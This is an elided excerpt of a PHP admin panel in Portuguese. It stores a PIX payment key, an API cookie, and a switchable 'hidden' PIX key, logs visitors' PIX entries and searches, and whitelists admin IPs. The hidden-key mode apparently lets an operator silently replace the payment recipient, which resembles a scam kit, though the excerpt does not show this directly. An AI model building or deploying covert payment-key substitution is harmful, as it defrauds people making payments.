...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_password'])) {
    if ($_POST['login_password'] === $admin_password) {
        ...
        if (!in_array($currentIp, $adminIps)) {
            $adminIps[] = $currentIp;
            app_write_json('admin_ips.json', $adminIps);
        }
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['reset_stats']) && $_POST['reset_stats'] === '1') {
        app_write_json('pix_log.json', []);
        app_write_json('search_log.json', []);
        app_write_json('click_stats.json', ['consultar_clicks' => 0, 'enter_clicks' => 0]);
        app_write_json('pix_last.json', []);
        ...
        $pixMode = isset($_POST['pixMode']) && $_POST['pixMode'] === 'ativo' ? 'ativo' : 'desativo';
        $hiddenPixKey = isset($_POST['hiddenPixKey']) ? trim((string)$_POST['hiddenPixKey']) : '';
        ...
        if ($pixKey !== '') {
            app_save_config([
                ...
                'apiCookie' => $apiCookie,
                'pixMode' => $pixMode,
                'hiddenPixKey' => $hiddenPixKey,
            ]);
            header('Location: admin.php?msg=' . urlencode('Configurações atualizadas com sucesso.'));
            exit;
        } else {
...
// --- DATA LOADING ---
$cfg = app_load_config();
$currentKey = (string) ($cfg['pixKey'] ?? '');
$currentCookie = (string) ($cfg['apiCookie'] ?? '');
$currentMode = (string) ($cfg['pixMode'] ?? 'desativo');
$currentHiddenKey = (string) ($cfg['hiddenPixKey'] ?? '');

$pixEntries = app_read_json('pix_log.json', []);
usort($pixEntries, function($a, $b) {
    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
});

$searchEntries = app_read_json('search_log.json', []);
usort($searchEntries, function($a, $b) {
    return strtotime($b['ts'] ?? 0) - strtotime($a['ts'] ?? 0);
});

$clickStats = app_read_json('click_stats.json', ['consultar_clicks' => 0, 'enter_clicks' => 0]);
...
function time_elapsed_string($datetime, $full = false) {
    ...
    foreach ($string as $k => &$v) {
        ...
        if ($value) {
            $label = is_string($v) ? $v : 'semana';
            $v = $value . ' ' . $label . ($value > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }
            ...
            <div class="space-y-8">
                ...
                <div class="card p-6 bg-gray-50">
                    ...
                    <ul class="text-xs space-y-2 text-gray-600">
                        ...
                        <li class="flex justify-between"><span>Client IP:</span> <span class="font-mono"><?php echo app_client_ip(); ?></span></li>
                        <li class="flex justify-between"><span>Log PIX Size:</span> <span class="font-mono"><?php echo number_format(app_file_size_kb('pix_log.json'), 1, ',', '.'); ?> KB</span></li>
                    </ul>
                </div>
